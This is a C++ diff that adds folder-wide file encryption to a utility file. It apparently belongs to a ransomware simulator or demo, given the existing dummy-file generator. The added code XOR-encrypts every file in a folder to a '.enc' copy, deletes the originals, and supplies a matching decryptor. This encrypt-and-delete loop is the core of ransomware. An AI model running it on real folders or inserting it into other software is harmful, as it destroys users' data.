@@ -1,6 +1,6 @@
 #include "pch.h"
 #include "utils.h"
-
+namespace fs = std::filesystem;
 std::wstring GetCurrentUsername()
 {
     char* username = nullptr;
@@ -87,6 +87,46 @@ void GenerateDummyFiles(const std::wstring& folderPath, int countPerType)
             }
 
             file.close();
+        }
+    }
+}
+
+void ProcessFile(const std::wstring& inPath, const std::wstring& outPath, const std::string& key) {
+    std::ifstream inFile(inPath, std::ios::binary);
+    if (!inFile) return;
+
+    std::vector<char> buffer((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
+    inFile.close();
+
+    for (size_t i = 0; i < buffer.size(); ++i) {
+        buffer[i] ^= key[i % key.size()] ^ (char)(i % 251);  // simple XOR maison
+    }
+
+    std::ofstream outFile(outPath, std::ios::binary);
+    outFile.write(buffer.data(), buffer.size());
+    outFile.close();
+}
+
+void EncryptAllFilesInFolder(const std::wstring& folderPath, const std::string& key) {
+    for (const auto& entry : fs::directory_iterator(folderPath)) {
+        if (entry.is_regular_file()) {
+            std::wstring original = entry.path();
+            std::wstring encrypted = original + L".enc";
+
+            ProcessFile(original, encrypted, key);
+            DeleteFileW(original.c_str());
+        }
+    }
+}
+
+void DecryptAllFilesInFolder(const std::wstring& folderPath, const std::string& key) {
+    for (const auto& entry : fs::directory_iterator(folderPath)) {
+        if (entry.is_regular_file() && entry.path().extension() == L".enc") {
+            std::wstring encrypted = entry.path();
+            std::wstring original = encrypted.substr(0, encrypted.length() - 4); // retirer ".enc"
+
+            ProcessFile(encrypted, original, key);
+            DeleteFileW(encrypted.c_str());
         }
     }
 }
